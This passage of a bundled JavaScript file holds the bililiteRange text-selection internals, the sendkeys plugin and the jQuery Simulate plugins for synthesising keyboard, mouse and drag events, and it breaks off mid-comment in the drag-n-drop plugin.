	clone.style.visibility = 'hidden';
	clone.style.position = 'absolute';
	this._el.parentNode.insertBefore(clone, this._el);
	clone.style.height = '1px';
	clone.value = this._el.value.slice(0, rng[0]);
	var top = clone.scrollHeight;
	// this gives the bottom of the text, so we have to subtract the height of a single line
	clone.value = 'X';
	top -= clone.scrollHeight;
	clone.parentNode.removeChild(clone);
	return top;
}
InputRange.prototype._nativeWrap = function() {throw new Error("Cannot wrap in a text element")};

function W3CRange(){}
W3CRange.prototype = new Range();
W3CRange.prototype._nativeRange = function (bounds){
	var rng = this._doc.createRange();
	rng.selectNodeContents(this._el);
	if (bounds){
		w3cmoveBoundary (rng, bounds[0], true, this._el);
		rng.collapse (true);
		w3cmoveBoundary (rng, bounds[1]-bounds[0], false, this._el);
	}
	return rng;
};
W3CRange.prototype._nativeSelect = function (rng){
 var objectswin = this._win.getSelection();
	 if(objectswin){
      this._win.getSelection().removeAllRanges();
	this._win.getSelection().addRange (rng);
}
};
W3CRange.prototype._nativeSelection = function (){
	// returns [start, end] for the selection constrained to be in element
	var rng = this._nativeRange(); // range of the element to constrain to
	 var objectswin = this._win.getSelection();
	if (!objectswin || !Object.prototype.hasOwnProperty.call(objectswin, 'rangeCount'))
		return [this.length(), this.length()];
	if (this._win.getSelection().rangeCount == 0) return [this.length(), this.length()]; // append to the end
	var sel = this._win.getSelection().getRangeAt(0);
	return [
		w3cstart(sel, rng),
		w3cend (sel, rng)
	];
	}
W3CRange.prototype._nativeGetText = function (rng){
	return String.prototype.slice.apply(this._el.textContent, this.bounds());
	// return rng.toString(); // this fails in IE11 since it insists on inserting \r's before \n's in Ranges. node.textContent works as expected
};
W3CRange.prototype._nativeSetText = function (text, rng){
	rng.deleteContents();
	rng.insertNode (this._doc.createTextNode(text));
	if (canNormalize) this._el.normalize(); // merge the text with the surrounding text
};
W3CRange.prototype._nativeEOL = function(){
	var rng = this._nativeRange(this.bounds());
	rng.deleteContents();
	var br = this._doc.createElement('br');
	br.setAttribute ('_moz_dirty', ''); // for Firefox
	rng.insertNode (br);
	rng.insertNode (this._doc.createTextNode('\n'));
	rng.collapse (false);
};
W3CRange.prototype._nativeTop = function(rng){
	if (this.length == 0) return 0; // no text, no scrolling
	if (rng.toString() == ''){
		var textnode = this._doc.createTextNode('X');
		rng.insertNode (textnode);
	}
	var startrng = this._nativeRange([0,1]);
	var top = rng.getBoundingClientRect().top - startrng.getBoundingClientRect().top;
	if (textnode) textnode.parentNode.removeChild(textnode);
	return top;
}
W3CRange.prototype._nativeWrap = function(n, rng) {
	rng.surroundContents(n);
};

// W3C internals
function nextnode (node, root){
	//  in-order traversal
	// we've already visited node, so get kids then siblings
	if (node.firstChild) return node.firstChild;
	if (node.nextSibling) return node.nextSibling;
	if (node===root) return null;
	while (node.parentNode){
		// get uncles
		node = node.parentNode;
		if (node == root) return null;
		if (node.nextSibling) return node.nextSibling;
	}
	return null;
}
function w3cmoveBoundary (rng, n, bStart, el){
	// move the boundary (bStart == true ? start : end) n characters forward, up to the end of element el. Forward only!
	// if the start is moved after the end, then an exception is raised
	if (n <= 0) return;
	var node = rng[bStart ? 'startContainer' : 'endContainer'];
	if (node.nodeType == 3){
	  // we may be starting somewhere into the text
	  n += rng[bStart ? 'startOffset' : 'endOffset'];
	}
	while (node){
		if (node.nodeType == 3){
			var length = node.nodeValue.length;
			if (n <= length){
				rng[bStart ? 'setStart' : 'setEnd'](node, n);
				// special case: if we end next to a <br>, include that node.
				if (n == length){
					// skip past zero-length text nodes
					for (var next = nextnode (node, el); next && next.nodeType==3 && next.nodeValue.length == 0; next = nextnode(next, el)){
						rng[bStart ? 'setStartAfter' : 'setEndAfter'](next);
					}
					if (next && next.nodeType == 1 && next.nodeName == "BR") rng[bStart ? 'setStartAfter' : 'setEndAfter'](next);
				}
				return;
			}else{
				rng[bStart ? 'setStartAfter' : 'setEndAfter'](node); // skip past this one
				n -= length; // and eat these characters
			}
		}
		node = nextnode (node, el);
	}
}
var     START_TO_START                 = 0; // from the w3c definitions
var     START_TO_END                   = 1;
var     END_TO_END                     = 2;
var     END_TO_START                   = 3;
// from the Mozilla documentation, for range.compareBoundaryPoints(how, sourceRange)
// -1, 0, or 1, indicating whether the corresponding boundary-point of range is respectively before, equal to, or after the corresponding boundary-point of sourceRange.
    // * Range.END_TO_END compares the end boundary-point of sourceRange to the end boundary-point of range.
    // * Range.END_TO_START compares the end boundary-point of sourceRange to the start boundary-point of range.
    // * Range.START_TO_END compares the start boundary-point of sourceRange to the end boundary-point of range.
    // * Range.START_TO_START compares the start boundary-point of sourceRange to the start boundary-point of range.
function w3cstart(rng, constraint){
	if (rng.compareBoundaryPoints (START_TO_START, constraint) <= 0) return 0; // at or before the beginning
	if (rng.compareBoundaryPoints (END_TO_START, constraint) >= 0) return constraint.toString().length;
	rng = rng.cloneRange(); // don't change the original
	rng.setEnd (constraint.endContainer, constraint.endOffset); // they now end at the same place
	return constraint.toString().replace(/\r/g, '').length - rng.toString().replace(/\r/g, '').length;
}
function w3cend (rng, constraint){
	if (rng.compareBoundaryPoints (END_TO_END, constraint) >= 0) return constraint.toString().length; // at or after the end
	if (rng.compareBoundaryPoints (START_TO_END, constraint) <= 0) return 0;
	rng = rng.cloneRange(); // don't change the original
	rng.setStart (constraint.startContainer, constraint.startOffset); // they now start at the same place
	return rng.toString().replace(/\r/g, '').length;
}

function NothingRange(){}
NothingRange.prototype = new Range();
NothingRange.prototype._nativeRange = function(bounds) {
	return bounds || [0,this.length()];
};
NothingRange.prototype._nativeSelect = function (rng){ // do nothing
};
NothingRange.prototype._nativeSelection = function(){
	return [0,0];
};
NothingRange.prototype._nativeGetText = function (rng){
	return this._el[this._textProp].substring(rng[0], rng[1]);
};
NothingRange.prototype._nativeSetText = function (text, rng){
	var val = this._el[this._textProp];
	this._el[this._textProp] = val.substring(0, rng[0]) + text + val.substring(rng[1]);
};
NothingRange.prototype._nativeEOL = function(){
	this.text('\n');
};
NothingRange.prototype._nativeTop = function(){
	return 0;
};
NothingRange.prototype._nativeWrap = function() {throw new Error("Wrapping not implemented")};


// data for elements, similar to jQuery data, but allows for monitoring with custom events
var data = []; // to avoid attaching javascript objects to DOM elements, to avoid memory leaks
bililiteRange.fn.data = function(){
	var index = this.element().bililiteRangeData;
	if (index == undefined){
		index = this.element().bililiteRangeData = data.length;
		data[index] = new Data(this);
	}
	return data[index];
}
try {
	Object.defineProperty({},'foo',{}); // IE8 will throw an error
	var Data = function(rng) {
		// we use JSON.stringify to display the data values. To make some of those non-enumerable, we have to use properties
		Object.defineProperty(this, 'values', {
			value: {}
		});
		Object.defineProperty(this, 'sourceRange', {
			value: rng
		});
		Object.defineProperty(this, 'toJSON', {
			value: function(){
				var ret = {};
				for (var i in Data.prototype) if (i in this.values) ret[i] = this.values[i];
				return ret;
			}
		});
		// to display all the properties (not just those changed), use JSON.stringify(state.all)
		Object.defineProperty(this, 'all', {
			get: function(){
				var ret = {};
				for (var i in Data.prototype) ret[i] = this[i];
				return ret;
			}
		});
	}

	Data.prototype = {};
	Object.defineProperty(Data.prototype, 'values', {
		value: {}
	});
	Object.defineProperty(Data.prototype, 'monitored', {
		value: {}
	});

	bililiteRange.data = function (name, newdesc){
		newdesc = newdesc || {};
		var desc = Object.getOwnPropertyDescriptor(Data.prototype, name) || {};
		if ('enumerable' in newdesc) desc.enumerable = !!newdesc.enumerable;
		if (!('enumerable' in desc)) desc.enumerable = true; // default
		if ('value' in newdesc) Data.prototype.values[name] = newdesc.value;
		if ('monitored' in newdesc) Data.prototype.monitored[name] = newdesc.monitored;
		desc.configurable = true;
		desc.get = function (){
			if (name in this.values) return this.values[name];
			return Data.prototype.values[name];
		};
		desc.set = function (value){
			this.values[name] = value;
			if (Data.prototype.monitored[name]) this.sourceRange.dispatch({
				type: 'bililiteRangeData',
				bubbles: true,
				detail: {name: name, value: value}
			});
		}
		Object.defineProperty(Data.prototype, name, desc);
	}
}catch(err){
	// if we can't set object property properties, just use old-fashioned properties
  Data = function(rng){ this.sourceRange = rng };
	Data.prototype = {};
	bililiteRange.data = function(name, newdesc){
		if ('value' in newdesc) Data.prototype[name] = newdesc.value;
	}
}

})();

// Polyfill for forEach, per Mozilla documentation. https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/forEach#Polyfill
if (!Array.prototype.forEach)
{
  Array.prototype.forEach = function(fun /*, thisArg */)
  {
    "use strict";

    if (this === void 0 || this === null)
      throw new TypeError();

    var t = Object(this);
    var len = t.length >>> 0;
    if (typeof fun !== "function")
      throw new TypeError();

    var thisArg = arguments.length >= 2 ? arguments[1] : void 0;
    for (var i = 0; i < len; i++)
    {
      if (i in t)
        fun.call(thisArg, t[i], i, t);
    }
  };
}







// insert characters in a textarea or text input field
// special characters are enclosed in {}; use {{} for the { character itself
// documentation: http://bililite.com/blog/2008/08/20/the-fnsendkeys-plugin/
// Version: 4
// Copyright (c) 2013 Daniel Wachsstock
// MIT license:
// Permission is hereby granted, free of charge, to any person
// obtaining a copy of this software and associated documentation
// files (the "Software"), to deal in the Software without
// restriction, including without limitation the rights to use,
// copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the
// Software is furnished to do so, subject to the following
// conditions:

// The above copyright notice and this permission notice shall be
// included in all copies or substantial portions of the Software.

// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND,
// EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES
// OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND
// NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT
// HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY,
// WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
// FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR
// OTHER DEALINGS IN THE SOFTWARE.

(function($){

$.fn.sendkeys = function (x){
	x = x.replace(/([^{])\n/g, '$1{enter}'); // turn line feeds into explicit break insertions, but not if escaped
	return this.each( function(){
		bililiteRange(this).bounds('selection').sendkeys(x).select();
		this.focus();
	});
}; // sendkeys



$.fn.selectRng = function (){
	return this.each( function(){
		bililiteRange(this).bounds('selection').select();
		this.focus();
	});
}; // selectRng










// add a default handler for keydowns so that we can send keystrokes, even though code-generated events
// are untrusted (http://www.w3.org/TR/DOM-Level-3-Events/#trusted-events)
// documentation of special event handlers is at http://learn.jquery.com/events/event-extensions/
$.event.special.keydown = $.event.special.keydown || {};
$.event.special.keydown._default = function (evt){
	if (evt.isTrusted) return false;
	if (evt.ctrlKey || evt.altKey || evt.metaKey) return false; // only deal with printable characters. This may be a false assumption
	if (evt.key == null) return false; // nothing to print. Use the keymap plugin to set this
	var target = evt.target;
	if (target.isContentEditable || target.nodeName == 'INPUT' || target.nodeName == 'TEXTAREA') {
		// only insert into editable elements
		var key = evt.key;
		if (key.length > 1 && key.charAt(0) != '{') key = '{'+key+'}'; // sendkeys notation
		$(target).sendkeys(key);
		return true;
	}
	return false;
}
})(jQuery)












 /*!
 * jQuery Simulate v0.0.1 - simulate browser mouse and keyboard events
 * https://github.com/jquery/jquery-simulate
 *
 * Copyright 2012 jQuery Foundation and other contributors
 * Released under the MIT license.
 * http://jquery.org/license
 *
 * Date: Sun Dec 9 12:15:33 2012 -0500
 */

;(function( $, undefined ) {
	"use strict";

var rkeyEvent = /^key/,
	rmouseEvent = /^(?:mouse|contextmenu)|click/,
	rdocument = /\[object (?:HTML)?Document\]/;

function isDocument(ele) {
	return rdocument.test(Object.prototype.toString.call(ele));
}

function windowOfDocument(doc) {
	for (var i=0; i < window.frames.length; i+=1) {
		if (window.frames[i] && window.frames[i].document === doc) {
			return window.frames[i];
		}
	}
	return window;
}

$.fn.simulate = function( type, options ) {
	return this.each(function() {
		new $.simulate( this, type, options );
	});
};

$.simulate = function( elem, type, options ) {
	var method = $.camelCase( "simulate-" + type );

	this.target = elem;
	this.options = options || {};

	if ( this[ method ] ) {
		this[ method ]();
	} else {
		this.simulateEvent( elem, type, this.options );
	}
};

$.extend( $.simulate, {

	keyCode: {
		BACKSPACE: 8,
		COMMA: 188,
		DELETE: 46,
		DOWN: 40,
		END: 35,
		ENTER: 13,
		ESCAPE: 27,
		HOME: 36,
		LEFT: 37,
		NUMPAD_ADD: 107,
		NUMPAD_DECIMAL: 110,
		NUMPAD_DIVIDE: 111,
		NUMPAD_ENTER: 108,
		NUMPAD_MULTIPLY: 106,
		NUMPAD_SUBTRACT: 109,
		PAGE_DOWN: 34,
		PAGE_UP: 33,
		PERIOD: 190,
		RIGHT: 39,
		SPACE: 32,
		TAB: 9,
		UP: 38
	},

	buttonCode: {
		LEFT: 0,
		MIDDLE: 1,
		RIGHT: 2
	}
});

$.extend( $.simulate.prototype, {

	simulateEvent: function( elem, type, options ) {
		var event = this.createEvent( type, options );
		this.dispatchEvent( elem, type, event, options );
	},

	createEvent: function( type, options ) {
		if ( rkeyEvent.test( type ) ) {
			return this.keyEvent( type, options );
		}

		if ( rmouseEvent.test( type ) ) {
			return this.mouseEvent( type, options );
		}
	},

	mouseEvent: function( type, options ) {
		var event,
			eventDoc,
			doc = isDocument(this.target)? this.target : (this.target.ownerDocument || document),
			docEle,
			body;


		options = $.extend({
			bubbles: true,
			cancelable: (type !== "mousemove"),
			view: windowOfDocument(doc),
			detail: 0,
			screenX: 0,
			screenY: 0,
			clientX: 1,
			clientY: 1,
			ctrlKey: false,
			altKey: false,
			shiftKey: false,
			metaKey: false,
			button: 0,
			relatedTarget: undefined
		}, options );



		if ( doc.createEvent ) {
			event = doc.createEvent( "MouseEvents" );
			event.initMouseEvent( type, options.bubbles, options.cancelable,
				options.view, options.detail,
				options.screenX, options.screenY, options.clientX, options.clientY,
				options.ctrlKey, options.altKey, options.shiftKey, options.metaKey,
				options.button, options.relatedTarget || doc.body.parentNode );

			// IE 9+ creates events with pageX and pageY set to 0.
			// Trying to modify the properties throws an error,
			// so we define getters to return the correct values.
			if ( event.pageX === 0 && event.pageY === 0 && Object.defineProperty ) {
				eventDoc = isDocument(event.relatedTarget)? event.relatedTarget : (event.relatedTarget.ownerDocument || document);
				docEle = eventDoc.documentElement;
				body = eventDoc.body;

				Object.defineProperty( event, "pageX", {
					get: function() {
						return options.clientX +
							( docEle && docEle.scrollLeft || body && body.scrollLeft || 0 ) -
							( docEle && docEle.clientLeft || body && body.clientLeft || 0 );
					}
				});
				Object.defineProperty( event, "pageY", {
					get: function() {
						return options.clientY +
							( docEle && docEle.scrollTop || body && body.scrollTop || 0 ) -
							( docEle && docEle.clientTop || body && body.clientTop || 0 );
					}
				});
			}
		} else if ( doc.createEventObject ) {
			event = doc.createEventObject();
			$.extend( event, options );
			// standards event.button uses constants defined here: http://msdn.microsoft.com/en-us/library/ie/ff974877(v=vs.85).aspx
			// old IE event.button uses constants defined here: http://msdn.microsoft.com/en-us/library/ie/ms533544(v=vs.85).aspx
			// so we actually need to map the standard back to oldIE
			event.button = {
				0: 1,
				1: 4,
				2: 2
			}[ event.button ] || event.button;
		}

		return event;
	},

	keyEvent: function( type, options ) {
		var event, doc;
		options = $.extend({
			bubbles: true,
			cancelable: true,
			view: windowOfDocument(doc),
			ctrlKey: false,
			altKey: false,
			shiftKey: false,
			metaKey: false,
			keyCode: 0,
			charCode: undefined
		}, options );

		doc = isDocument(this.target)? this.target : (this.target.ownerDocument || document);
		if ( doc.createEvent ) {
			try {
				event = doc.createEvent( "KeyEvents" );
				event.initKeyEvent( type, options.bubbles, options.cancelable, options.view,
					options.ctrlKey, options.altKey, options.shiftKey, options.metaKey,
					options.keyCode, options.charCode );
			// initKeyEvent throws an exception in WebKit
			// see: http://stackoverflow.com/questions/6406784/initkeyevent-keypress-only-works-in-firefox-need-a-cross-browser-solution
			// and also https://bugs.webkit.org/show_bug.cgi?id=13368
			// fall back to a generic event until we decide to implement initKeyboardEvent
			} catch( err ) {
				event = doc.createEvent( "Events" );
				event.initEvent( type, options.bubbles, options.cancelable );
				$.extend( event, {
					view: options.view,
					ctrlKey: options.ctrlKey,
					altKey: options.altKey,
					shiftKey: options.shiftKey,
					metaKey: options.metaKey,
					keyCode: options.keyCode,
					charCode: options.charCode
				});
			}
		} else if ( doc.createEventObject ) {
			event = doc.createEventObject();
			$.extend( event, options );
		}

		if ( !!/msie [\w.]+/.exec( navigator.userAgent.toLowerCase() ) || (({}).toString.call( window.opera ) === "[object Opera]") ) {
			event.keyCode = (options.charCode > 0) ? options.charCode : options.keyCode;
			event.charCode = undefined;
		}

		return event;
	},

	dispatchEvent: function( elem, type, event, options ) {
		if (options.jQueryTrigger === true) {
			$(elem).trigger($.extend({}, event, options, {type: type}));
		}
		else if ( elem.dispatchEvent ) {
			elem.dispatchEvent( event );
		} else if ( elem.fireEvent ) {
			elem.fireEvent( "on" + type, event );
		}
	},

	simulateFocus: function() {
		var focusinEvent,
			triggered = false,
			$element = $( this.target );

		function trigger() {
			triggered = true;
		}

		$element.bind( "focus", trigger );
		$element[ 0 ].focus();

		if ( !triggered ) {
			focusinEvent = $.Event( "focusin" );
			focusinEvent.preventDefault();
			$element.trigger( focusinEvent );
			$element.triggerHandler( "focus" );
		}
		$element.unbind( "focus", trigger );
	},

	simulateBlur: function() {
		var focusoutEvent,
			triggered = false,
			$element = $( this.target );

		function trigger() {
			triggered = true;
		}

		$element.bind( "blur", trigger );
		$element[ 0 ].blur();

		// blur events are async in IE
		setTimeout(function() {
			// IE won't let the blur occur if the window is inactive
			if ( $element[ 0 ].ownerDocument.activeElement === $element[ 0 ] ) {
				$element[ 0 ].ownerDocument.body.focus();
			}

			// Firefox won't trigger events if the window is inactive
			// IE doesn't trigger events if we had to manually focus the body
			if ( !triggered ) {
				focusoutEvent = $.Event( "focusout" );
				focusoutEvent.preventDefault();
				$element.trigger( focusoutEvent );
				$element.triggerHandler( "blur" );
			}
			$element.unbind( "blur", trigger );
		}, 1 );
	}
});



/** complex events **/

function findCenter( elem ) {
	var offset,
		$document,
		$elem = $( elem );

	if ( isDocument($elem[0]) ) {
		$document = $elem;
		offset = { left: 0, top: 0 };
	}
	else {
		$document = $( $elem[0].ownerDocument || document );
		offset = $elem.offset();
	}

	return {
		x: offset.left + $elem.outerWidth() / 2 - $document.scrollLeft(),
		y: offset.top + $elem.outerHeight() / 2 - $document.scrollTop()
	};
}

function findCorner( elem ) {
	var offset,
		$document,
		$elem = $( elem );

	if ( isDocument($elem[0]) ) {
		$document = $elem;
		offset = { left: 0, top: 0 };
	}
	else {
		$document = $( $elem[0].ownerDocument || document );
		offset = $elem.offset();
	}

	return {
		x: offset.left - document.scrollLeft(),
		y: offset.top - document.scrollTop()
	};
}

$.extend( $.simulate.prototype, {
	simulateDrag: function() {
		var i = 0,
			target = this.target,
			options = this.options,
			center = options.handle === "corner" ? findCorner( target ) : findCenter( target ),
			x = Math.floor( center.x ),
			y = Math.floor( center.y ),
			coord = { clientX: x, clientY: y },
			dx = options.dx || ( options.x !== undefined ? options.x - x : 0 ),
			dy = options.dy || ( options.y !== undefined ? options.y - y : 0 ),
			moves = options.moves || 3;

		this.simulateEvent( target, "mousedown", coord );

		for ( ; i < moves ; i++ ) {
			x += dx / moves;
			y += dy / moves;

			coord = {
				clientX: Math.round( x ),
				clientY: Math.round( y )
			};

			this.simulateEvent( target.ownerDocument, "mousemove", coord );
		}

		if ( $.contains( document, target ) ) {
			this.simulateEvent( target, "mouseup", coord );
			this.simulateEvent( target, "click", coord );
		} else {
			this.simulateEvent( document, "mouseup", coord );
		}
	}
});

})( jQuery );






/*jshint camelcase:true, plusplus:true, forin:true, noarg:true, noempty:true, eqeqeq:true, bitwise:true, strict:true, undef:true, unused:true, curly:true, browser:true, devel:true, maxerr:100, white:false, onevar:false */
/*global jQuery:true $:true */

/* jQuery Simulate Extended Plugin 1.3.0
 * http://github.com/j-ulrich/jquery-simulate-ext
 *
 * Copyright (c) 2014 Jochen Ulrich
 * Licensed under the MIT license (MIT-LICENSE.txt).
 */

;(function( $ ) {
	"use strict";

	/* Overwrite the $.simulate.prototype.mouseEvent function
	 * to convert pageX/Y to clientX/Y
	 */
	var originalMouseEvent = $.simulate.prototype.mouseEvent,
		rdocument = /\[object (?:HTML)?Document\]/;

	$.simulate.prototype.mouseEvent = function(type, options) {
		options = options || {};
		if (options.pageX || options.pageY) {
			var doc = rdocument.test(Object.prototype.toString.call(this.target))? this.target : (this.target.ownerDocument || document);
			options.clientX = (options.pageX || 0) - $(doc).scrollLeft();
			options.clientY = (options.pageY || 0) - $(doc).scrollTop();
		}
		return originalMouseEvent.apply(this, [type, options]);
	};


})( jQuery );







/*jshint camelcase:true, plusplus:true, forin:true, noarg:true, noempty:true, eqeqeq:true, bitwise:true, strict:true, undef:true, unused:true, curly:true, browser:true, devel:true, maxerr:100, white:false, onevar:false */
/*global jQuery:true $:true */

/* jQuery Simulate Drag-n-Drop Plugin 1.3.0
 * http://github.com/j-ulrich/jquery-simulate-ext
 *
 * Copyright (c) 2014 Jochen Ulrich
 * Licensed under the MIT license (MIT-LICENSE.txt).
 */

;(function($, undefined) {
	"use strict";

	/* Overwrite the $.fn.simulate function to reduce the jQuery set to the first element for the
	 * drag-n-drop interactions.
	 */
	$.fn.simulate = function( type, options ) {
		switch (type) {
		case "drag":
		case "drop":
		case "drag-n-drop":
			var ele = this.first();
			new $.simulate( ele[0], type, options);
			return ele;
		default:
			return this.each(function() {
				new $.simulate( this, type, options );
			});
		}
	};

	var now = Date.now || function() { return new Date().getTime(); };

	var rdocument = /\[object (?:HTML)?Document\]/;
	/**
	 * Tests whether an object is an (HTML) document object.
	 * @param {DOM Element} elem - the object/element to be tested
	 * @returns {Boolean} <code>true</code> if <i>elem</i> is an (HTML) document object.
	 * @private
	 * @author julrich
	 * @since 1.1
	 */
	function isDocument( elem ) {
		return rdocument.test(Object.prototype.toString.call($(elem)[0]));
	}

	/**
	 * Selects the first match from an array.
	 * @param {Array} array - Array of objects to be be tested
	 * @param {Function} check - Callback function that accepts one argument (which will be one element
	 * from the <i>array</i>) and returns a boolean.
	 * @returns {Boolean|null} the first element in <i>array</i> for which <i>check</i> returns <code>true</code>.
	 * If none of the elements in <i>array</i> passes <i>check</i>, <code>null</code> is returned.
	 * @private
	 * @author julrich
	 * @since 1.1
	 */
	function selectFirstMatch(array, check) {
		var i;
		if ($.isFunction(check)) {
			for (i=0; i < array.length; i+=1) {
				if (check(array[i])) {
					return array[i];
				}
			}
			return null;
		}
		else {
			for (i=0; i < array.length; i+=1) {
				if (array[i]) {
					return array[i];
				}
			}
			return null;
		}
	}

	// Based on the findCenter function from jquery.simulate.js
	/**
	 * Calculates the position of the center of an DOM element.
	 * @param {DOM Element} elem - the element whose center should be calculated.
	 * @returns {Object} an object with the properties <code>x</code> and <code>y</code>
	 * representing the position of the center of <i>elem</i> in page relative coordinates
	 * (i.e. independent of any scrolling).
	 * @private
	 * @author julrich
	 * @since 1.0
	 */
	function findCenter( elem ) {
		var offset,
			$elem = $( elem );
		if ( isDocument($elem[0]) ) {
			offset = {left: 0, top: 0};
		}
		else {
			offset = $elem.offset();
		}

		return {
			x: offset.left + $elem.outerWidth() / 2,
			y: offset.top + $elem.outerHeight() / 2
		};
	}

	/**
	 * Converts page relative coordinates into client relative coordinates.
	 * @param {Numeric|Object} x - Either the x coordinate of the page relative coordinates or
	 * an object with the properties <code>pageX</code> and <code>pageY</code> representing page
	 * relative coordinates.
	 * @param {Numeric} [y] - If <i>x</i> is numeric (i.e. the x coordinate of page relative coordinates),
	 * then this is the y coordinate. If <i>x</i> is an object, this parameter is skipped.
	 * @param {DOM Document} [docRel] - Optional DOM document object used to calculate the client relative
	 * coordinates. The page relative coordinates are interpreted as being relative to that document and
	 * the scroll position of that document is used to calculate the client relative coordinates.
	 * By default, <code>document</code> is used.
	 * @returns {Object} an object representing the client relative coordinates corresponding to the
	 * given page relative coordinates. The object either provides the properties <code>x</code> and
	 * <code>y</code> when <i>x</i> and <i>y</i> were given as arguments, or <code>clientX</code>
	 * and <code>clientY</code> when the parameter <i>x</i> was given as an object (see above).
	 * @private
	 * @author julrich
	 * @since 1.0
	 */
	function pageToClientPos(x, y, docRel) {
		var $document;
		if ( isDocument(y) ) {
			$document = $(y);
		} else {
			$document = $(docRel || document);
		}

		if (typeof x === "number" && typeof y === "number") {
			return {
				x: x - $document.scrollLeft(),
				y: y - $document.scrollTop()
			};
		}
		else if (typeof x === "object" && x.pageX && x.pageY) {
			return {
				clientX: x.pageX - $document.scrollLeft(),
				clientY: x.pageY - $document.scrollTop()
			};
		}
	}

	/**
	 * Browser-independent implementation of <code>document.elementFromPoint()</code>.
	 *
	 * When run for the first time on a scrolled page, this function performs a check on how
	 * <code>document.elementFromPoint()</code> is implemented in the current browser. It stores
	 * the results in two static variables so that the check can be skipped for successive calls.
	 *
	 * @param {Numeric|Object} x - Either the x coordinate of client relative coordinates or an object
	 * with the properties <code>x</code> and <code>y</code> representing client relative coordinates.
	 * @param {Numeric} [y] - If <i>x</i> is numeric (i.e. the x coordinate of client relative coordinates),
	 * this is the y coordinate. If <i>x</i> is an object, this parameter is skipped.
	 * @param {DOM Document} [docRel] - Optional DOM document object
	 * @returns {DOM Element|Null}
	 * @private
	 * @author Nicolas Zeh (Basic idea), julrich
	 * @see http://www.zehnet.de/2010/11/19/document-elementfrompoint-a-jquery-solution/
	 * @since 1.0
	 */
	function elementAtPosition(x, y, docRel) {
		var doc;
		if ( isDocument(y) ) {
			doc = y;
		} else {
			doc = docRel || document;
		}

		if(!doc.elementFromPoint) {
			return null;
		}

		var clientX = x, clientY = y;
		if (typeof x === "object" && (x.clientX || x.clientY)) {
			clientX = x.clientX || 0 ;
			clientY = x.clientY || 0;
		}

		if(elementAtPosition.prototype.check)
		{
			var sl, ele;
			if ((sl = $(doc).scrollTop()) >0)
			{
				ele = doc.elementFromPoint(0, sl + $(window).height() -1);
				if ( ele !== null && ele.tagName.toUpperCase() === 'HTML' ) { ele = null; }
				elementAtPosition.prototype.nativeUsesRelative = ( ele === null );
			}
			else if((sl = $(doc).scrollLeft()) >0)
			{
				ele = doc.elementFromPoint(sl + $(window).width() -1, 0);
				if ( ele !== null && ele.tagName.toUpperCase() === 'HTML' ) { ele = null; }
				elementAtPosition.prototype.nativeUsesRelative = ( ele === null );
			}
			elementAtPosition.prototype.check = (sl<=0); // Check was not meaningful because we were at scroll position 0
		}

		if(!elementAtPosition.prototype.nativeUsesRelative)
		{
			clientX += $(doc).scrollLeft();
			clientY += $(doc).scrollTop();
		}

		return doc.elementFromPoint(clientX,clientY);
	}
	// Default values for the check variables
	elementAtPosition.prototype.check = true;
	elementAtPosition.prototype.nativeUsesRelative = true;

	/**
	 * Informs the rest of the world that the drag is finished.
	 * @param {DOM Element} ele - The element which was dragged.
	 * @param {Object} [options] - The drag options.
	 * @fires simulate-drag
	 * @private
	 * @author julrich
	 * @since 1.0
	 */
	function dragFinished(ele, options) {
		var opts = options || {};
		$(ele).trigger({type: "simulate-drag"});
		if ($.isFunction(opts.callback)) {
			opts.callback.apply(ele);
		}
	}

	/**
	 * Generates a series of <code>mousemove</code> events for a drag.
	 * @param {Object} self - The simulate object.
	 * @param {DOM Element} ele - The element which is dragged.
	 * @param {Object} start - The start coordinates of the drag, represented using the properties
	 * <code>x</code> and <code>y</code>.
	 * @param {Object} drag - The distance to be dragged, represented using the properties <code>dx</code>
	 * and <code>dy</code>.
	 * @param {Object} options - The drag options. Must have the property <code>interpolation</code>
	 * containing the interpolation options (<code>stepWidth</code>, <code>stepCount</code>, etc.).
	 * @requires eventTarget
	 * @requires now()
	 * @private
	 * @author julrich
	 * @since 1.0
	 */
	function interpolatedEvents(self, ele, start, drag, options) {
		var targetDoc = selectFirstMatch([ele, ele.ownerDocument], isDocument) || document,
			interpolOptions = options.interpolation,
			dragDistance = Math.sqrt(Math.pow(drag.dx,2) + Math.pow(drag.dy,2)), // sqrt(a^2 + b^2)
			stepWidth, stepCount, stepVector;

		if (interpolOptions.stepWidth) {
			stepWidth = parseInt(interpolOptions.stepWidth, 10);
			stepCount = Math.floor(dragDistance / stepWidth)-1;
			var stepScale = stepWidth / dragDistance;
			stepVector = {x: drag.dx*stepScale, y: drag.dy*stepScale };
		}
		else {
			stepCount = parseInt(interpolOptions.stepCount, 10);
			stepWidth = dragDistance / (stepCount+1);
			stepVector = {x: drag.dx/(stepCount+1), y: drag.dy/(stepCount+1)};
		}


		var coords = $.extend({},start);

		/**
		 * Calculates the effective coordinates for one <code>mousemove</code> event and fires the event.
		 * @requires eventTarget
		 * @requires targetDoc
		 * @requires coords
		 * @requires stepVector
		 * @requires interpolOptions
		 * @fires mousemove
		 * @inner
		 * @author julrich
		 * @since 1.0
		 */
		function interpolationStep() {
			coords.x += stepVector.x;
			coords.y += stepVector.y;
			var effectiveCoords = {pageX: coords.x, pageY: coords.y};
			if (interpolOptions.shaky && (interpolOptions.shaky === true || !isNaN(parseInt(interpolOptions.shaky,10)) )) {
				var amplitude = (interpolOptions.shaky === true)? 1 : parseInt(interpolOptions.shaky,10);
				effectiveCoords.pageX += Math.floor(Math.random()*(2*amplitude+1)-amplitude);
				effectiveCoords.pageY += Math.floor(Math.random()*(2*amplitude+1)-amplitude);
			}
			var clientCoord = pageToClientPos(effectiveCoords, targetDoc),
				eventTarget = elementAtPosition(clientCoord, targetDoc) || ele;
			self.simulateEvent( eventTarget, "mousemove", {pageX: Math.round(effectiveCoords.pageX), pageY: Math.round(effectiveCoords.pageY)});
		}


		var lastTime;

		/**
		 * Performs one interpolation step (i.e. cares about firing the event) and then sleeps for
		 * <code>stepDelay</code> milliseconds.
